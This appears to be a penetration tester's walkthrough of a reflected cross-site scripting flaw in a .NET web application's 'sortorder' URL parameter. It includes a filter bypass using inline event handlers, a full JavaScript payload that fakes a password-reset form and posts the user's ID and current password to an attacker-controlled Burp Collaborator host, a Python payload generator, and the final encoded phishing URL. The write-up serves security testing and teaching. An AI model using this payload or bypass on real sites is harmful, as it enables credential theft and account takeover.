# Web Application Exploit Walkthrough: Reflected Cross-Site Scripting (XSS): JavaScript Injection into HTTP GET URL Parameters 

## Background

This finding was discovered in the context of a Web application built on the .NET stack. 

## Initial Discovery

Automated tools are not everything when it comes to penetration testing, but they truly shine when the tester needs rapid information gathering across a wide attack surface. In this scenario, Burp Suite Pro was used to initiate an authenticated crawl and attack scan to spider the application.

During the active scanning phase, Burp flagged a request similar to what is shown below, and categorized it as high-severity, firm-confidence:

```
GET /tickets/history/726?sortorder=c2xyfd6bd6%22%3e%3e%3c HTTP/1.1
Host: staging.example.com
```

Within the response body payload, we observe that the value passed as an argument for the query string parameter `sortorder` has not only been reflected in the response output, but also (this is the important part) rendered as literal HTML for the browser to interpret:

```
<li class="active">
   <a href="/tickets/history/726?sortorder=c2xyfd6bd6">
      ><" data-skip="0" class="page-link" >
         1
   </a>
</li>
```

Notice that `%22` (URL-encoded double quote) in the original query string is interpreted as a double-quote character in the HTML, effectively closing the `href` attribute on the `<a>` tag. This means all following characters are also directly injected into the DOM as markup. Classic reflected XSS! 

## XSS Proof of Concept (PoC)

This has all initial indicators of a true cross-site scripting vulnerability, but it needs to be proven. Can we run arbitrary JavaScript in the application, leveraging this injection point?

### Testing with `<script>` Elements

We may initially try to inject an entire `<script>` element into the DOM through the query parameters. In this scenario it was unsuccessful, as there seems to be some form of input validation on the server. Specifically, the web server responds with an HTTP 200 OK, however, the response body is empty for requests that are effectively rejected. The server returns an HTML document for "successful" payloads, as we observed in the initial automated finding from Burp.

The application rejects:

```
<script
```
and
```
<img 
```

...but allows:

```
< script 
< img 
```
...and _most importantly_, inline event handlers:

```
onmouseover=%22alert(123)%22
```

### Inline Event Handlers

JavaScript is not only run from the context of HTML Script elements. It can also be bound to specific HTML elements as inline event handlers.

For example, the following HTML indicates that an alert will fire in the browser when the end user triggers the "onmouseover" event on this element. Mouse over the button, observe the message, "123":

```
<input type="submit" text="Go" onmouseover="alert(123)" />
```

This approach to JavaScript can sometimes afford the possibility of XSS where script tags and angle brackets are blocked by input validation. Inline event handlers don't require angle brackets, or script tags for that matter.

The next PoC payload is as follows:

```
c2xyfd6bd6%22%20onmouseover=%22%28%66%75%6e%63%74%69%6f%6e%20%28%29%20%7b%61%6c%65%72%74%28%39%39%39%39%39%29%7d%29%28%29%3b%22%3e
```

Without the URL encoding above, it looks like this:

```
" onmouseover="(function () {alert(99999)})();">
```

This payload attempts to close the `href` attribute, as before, but also introduce a new `onmouseover` event handler to the `<a>` tag. The goal is to have the web server render the following markup in the response:

```
<a href="/tickets/history/726?sortorder=c2xyfd6bd6" onmouseover="(function () {alert(99999)})();">
```

Sure enough, this works, and if the user mouses over this element in the UI, an alert box fires with the value `99999`.

Our next goal is to inject more dramatic JavaScript that has a high probability of executing, based on user interaction.

## Crafting a Weaponized Payload

After several passes, I've come up with the following JavaScript as the payload I'd like to inject into the page:

```
(function () {
    var doc = document,
    //  these DO NOT minify to comma separated
    b = 'block',
    i = 'input',
    l = 'label',
    n = 'name',
    p = 'password',
    s = 'submit',
    t = 'type',
    a = '/Content/images/',
    z = '0 auto',
    body = doc.body,
    logo = doc.createElement('img'),
    intro = doc.createElement('p'),
    form = doc.createElement('form'),
    currentPasswordLabel = doc.createElement(l),
    currentPasswordField = doc.createElement(i),
    currentPasswordText = 'Current ' + p,
    newPasswordLabel = doc.createElement(l),
    newPasswordField = doc.createElement(i),
    confirmPasswordLabel = doc.createElement(l),
    confirmPasswordField = doc.createElement(i),
    usernameField = doc.createElement(i),
    e = doc.querySelectorAll('[id=client_info]')[1],
    h = 'h6',
    fh = e.innerHTML.indexOf(h),
    lh = e.innerHTML.lastIndexOf(h),
    u = e.innerHTML.slice(fh+3,lh-2),
    submitBtn = doc.createElement(i),
    page = doc.getElementById('page_wrapper');

    // hide body element
    page.style.display = 'none';

    // create logo, append to body element
    logo.src = a + 'logo-transparent.png';
    logo.style.margin = '9em auto 1em';
    logo.style.display = b;
    page.after(logo);

    // create intro text
    intro.innerHTML = 'Password reset required';
    intro.style.textAlign = 'center';
    intro.style.color = 'red';
    logo.after(intro);

    // create form
    form.method = 'post';
    // Burp Collaborator destination URL
    form.action = 'https://a6hmjodjqbcjza207vy5gvddd4jv7lva.oastify.com';
    form.style.width = '200px';
    form.style.margin = z;
    
    // create currentPassword field

    currentPasswordField.setAttribute(n,'current' + p);
    currentPasswordField.setAttribute(t,p);
    currentPasswordLabel.innerHTML = currentPasswordText;
    currentPasswordLabel.appendChild(currentPasswordField);
    form.appendChild(currentPasswordLabel);

    // create new/confirm password fields

    newPasswordField.setAttribute(t,p);
    newPasswordField.style.display = b;
    confirmPasswordField.setAttribute(t,p);
    confirmPasswordField.style.display = b;
    newPasswordLabel.innerHTML = 'New ' + p;
    confirmPasswordLabel.innerHTML = 'Confirm ' + p;
    newPasswordLabel.appendChild(newPasswordField);
    form.appendChild(newPasswordLabel);
    confirmPasswordLabel.appendChild(confirmPasswordField);
    form.appendChild(confirmPasswordLabel);
    
    // hidden form (username/ID)
    usernameField.setAttribute(t,'hidden');
    usernameField.setAttribute(n,'u');
    usernameField.value = u;
    form.appendChild(usernameField);

    // submit button
    submitBtn.setAttribute(t,s);
    submitBtn.setAttribute('text','Submit');
    submitBtn.style.display = b;
    submitBtn.style.margin = z;
    form.appendChild(submitBtn);
    
    // write form elements to body element
    intro.after(form);
  })();
```

## Using Python to Generate the Final Payload

It can be laborious to manually construct the payload. The manual process involves lots of copying and pasting to minify the JavaScript, encode the result, and piece together the final URL. Many of these steps can be automated with a Python script.

```
'''
    Usage: $ python3 generate_urlencoded_xss_userid_payload.py
'''

import calendar
import subprocess
import time
import urllib.parse


timestamp = calendar.timegm(time.gmtime())

# minify original JS file
minified_filename = f'./xss-payload-userid.min.{timestamp}.js'
# command we want to replicate is:
# $ npx uglify-js -o ./output.js --mangle -- ./input.js
# `--mangle` obfuscates variable names
uglify_cmd = ['npx','uglify-js','-m','-o',minified_filename,'xss-payload-userid.js']
minify_js_subprocess = subprocess.run(uglify_cmd,capture_output=True,text=True)

minified_js = ''
with open(minified_filename,'rt') as minified_js_file:
    minified_js = minified_js_file.read()

# ensure there is a space between `function` and `()`
js = minified_js.replace('function()','function ()')

# ensure single quotes are used, 
# as double-quotes will be interpreted 
# by browser as terminating the inline handler,
# therefore breaking the payload
js = js.replace('"','\'')

# URL-encode the minified JS
urlencoded_min_js = urllib.parse.quote(js)

# set up encoded URL payload
prefix = 'https://examplehost/path/0?sortorder=c%22%20onmouseover=%22'
suffix = '%22%3e'

url_payload = f'{prefix}{urlencoded_min_js}{suffix}'

with open('./final_xss_payload_userid.txt','wt') as payload_file:
    payload_file.write(url_payload)
    print(url_payload)

```

Having this script available allows to fine-tune the original JavaScript payload, "compile" it into a usable payload, rinse and repeat until we find a crafted URL exploit that accomplishes what we want.

This is the final URL:

```
https://examplehost/path/0?sortorder=c%22%20onmouseover=%22%28function%20%28%29%7Bvar%20e%3Ddocument%2Ct%3D%27block%27%2Cn%3D%27input%27%2Cr%3D%27label%27%2Cl%3D%27name%27%2Ca%3D%27password%27%2Ci%3D%27submit%27%2Cd%3D%27type%27%2Cs%3D%27/Content/images/%27%2Cp%3D%270%20auto%27%2Cm%3De.body%2Cc%3De.createElement%28%27img%27%29%2Co%3De.createElement%28%27p%27%29%2Cy%3De.createElement%28%27form%27%29%2Cu%3De.createElement%28r%29%2Cb%3De.createElement%28n%29%2Ch%3D%27Current%20%27%2Ba%2CE%3De.createElement%28r%29%2Cg%3De.createElement%28n%29%2CC%3De.createElement%28r%29%2Cf%3De.createElement%28n%29%2CA%3De.createElement%28n%29%2CH%3De.querySelectorAll%28%27%5Bid%3Dclient_info%5D%27%29%5B1%5D%2CL%3D%27h6%27%2CM%3DH.innerHTML.indexOf%28L%29%2CT%3DH.innerHTML.lastIndexOf%28L%29%2Cv%3DH.innerHTML.slice%28M%2B3%2CT-2%29%2Cw%3De.createElement%28n%29%2Cx%3De.getElementById%28%27page_wrapper%27%29%3Bx.style.display%3D%27none%27%3Bc.src%3Ds%2B%27logo-transparent.png%27%3Bc.style.margin%3D%279em%20auto%201em%27%3Bc.style.display%3Dt%3Bx.after%28c%29%3Bo.innerHTML%3D%27Password%20reset%20required%27%3Bo.style.textAlign%3D%27center%27%3Bo.style.color%3D%27red%27%3Bc.after%28o%29%3By.method%3D%27post%27%3By.action%3D%27https%3A//12345.oastify.com%27%3By.style.width%3D%27200px%27%3By.style.margin%3Dp%3Bb.setAttribute%28l%2C%27current%27%2Ba%29%3Bb.setAttribute%28d%2Ca%29%3Bu.innerHTML%3Dh%3Bu.appendChild%28b%29%3By.appendChild%28u%29%3Bg.setAttribute%28d%2Ca%29%3Bg.style.display%3Dt%3Bf.setAttribute%28d%2Ca%29%3Bf.style.display%3Dt%3BE.innerHTML%3D%27New%20%27%2Ba%3BC.innerHTML%3D%27Confirm%20%27%2Ba%3BE.appendChild%28g%29%3By.appendChild%28E%29%3BC.appendChild%28f%29%3By.appendChild%28C%29%3BA.setAttribute%28d%2C%27hidden%27%29%3BA.setAttribute%28l%2C%27u%27%29%3BA.value%3Dv%3By.appendChild%28A%29%3Bw.setAttribute%28d%2Ci%29%3Bw.setAttribute%28%27text%27%2C%27Submit%27%29%3Bw.style.display%3Dt%3Bw.style.margin%3Dp%3By.appendChild%28w%29%3Bo.after%28y%29%7D%29%28%29%3B%22%3e
```

In this scenario, after navigating to this URL (from an email link for example), the user activates the malicious script by mousing over the element into which the script has been injected. This launches an immediately-invoked function expression (IIFE), which redresses the UI as a password reset page, leveraging the logo already used by the app. The goal of course, is to leverage this social engineering tactic to convince the end user that the UI redress is authentic. If the user completes the form, the user ID is extracted from the markup and bundled with the "current password" value entered by the user. All other values in form fields are discarded. When the user submits the form, it is transmitted to a Burp Collaborator resource which we (the attacker/tester) have under our control. This demonstrates how reflected XSS, with a carefully crafted exploitation payload, can leverage social engineering to harvest a user's credentials and accomplish account takeover.
